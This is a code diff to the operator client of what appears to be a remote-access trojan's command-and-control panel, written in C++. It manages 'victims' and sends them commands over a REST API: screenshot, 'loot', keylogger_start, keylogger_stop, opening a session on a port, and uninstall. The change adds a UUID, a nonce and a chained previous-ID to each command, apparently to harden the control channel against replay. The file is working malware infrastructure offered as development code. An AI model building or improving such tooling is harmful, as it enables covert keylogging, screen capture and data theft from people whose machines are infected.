@@ -6,6 +6,7 @@
 #include "LogManager.hpp"
 #include "RESTClient.hpp"
 #include "SessionManager.hpp"
+#include "Types.hpp"
 #include "VictimManager.hpp"
 #include <print>
 #include <stdexcept>
@@ -21,7 +22,8 @@ Client::Client(const std::string& db_path) :
     m_vic_man( VictimManager::instance() ),
     m_sess_man( SessionManager::instance() ),
     m_rest_client(""),
-    m_status_text("")
+    m_status_text(""),
+    m_last_id( 0 )
 {
 
 }
@@ -181,6 +183,11 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
         CommandDAO timeout_command;
         timeout_command.command = std::format("timeout {}", timeout);
         timeout_command.client = client_id;
+        timeout_command.uid = generate_uuid();
+        timeout_command.nonce = generate_nonce();
+        timeout_command.prev = m_last_id;
+
+        ++m_last_id;
 
         const auto& cmd = m_rest_client.post<CommandDAO>("api/commands", timeout_command);
 
@@ -202,6 +209,11 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
         CommandDAO cmd;
         cmd.command = std::format("session {}", port);
         cmd.client = client_id;
+        cmd.uid = generate_uuid();
+        cmd.nonce = generate_nonce();
+        cmd.prev = m_last_id;
+
+        ++m_last_id;
 
         const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
 
@@ -223,6 +235,11 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
         CommandDAO cmd;
         cmd.command = "close";
         cmd.client = client_id;
+        cmd.uid = generate_uuid();
+        cmd.nonce = generate_nonce();
+        cmd.prev = m_last_id;
+
+        ++m_last_id;
 
         const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
 
@@ -244,6 +261,11 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
         CommandDAO cmd;
         cmd.command = "screenshot";
         cmd.client = client_id;
+        cmd.uid = generate_uuid();
+        cmd.nonce = generate_nonce();
+        cmd.prev = m_last_id;
+
+        ++m_last_id;
 
         const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
 
@@ -265,6 +287,11 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
         CommandDAO cmd;
         cmd.command = "loot";
         cmd.client = client_id;
+        cmd.uid = generate_uuid();
+        cmd.nonce = generate_nonce();
+        cmd.prev = m_last_id;
+
+        ++m_last_id;
 
         const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
 
@@ -286,6 +313,11 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
         CommandDAO cmd;
         cmd.command = "keylogger_start";
         cmd.client = client_id;
+        cmd.uid = generate_uuid();
+        cmd.nonce = generate_nonce();
+        cmd.prev = m_last_id;
+
+        ++m_last_id;
 
         const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
 
@@ -307,6 +339,11 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
         CommandDAO cmd;
         cmd.command = "keylogger_stop";
         cmd.client = client_id;
+        cmd.uid = generate_uuid();
+        cmd.nonce = generate_nonce();
+        cmd.prev = m_last_id;
+
+        ++m_last_id;
 
         const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
 
@@ -328,6 +365,11 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
         CommandDAO cmd;
         cmd.command = "uninstall";
         cmd.client = client_id;
+        cmd.uid = generate_uuid();
+        cmd.nonce = generate_nonce();
+        cmd.prev = m_last_id;
+
+        ++m_last_id;
 
         const auto& res = m_rest_client.post<CommandDAO>("api/commands", cmd);
 
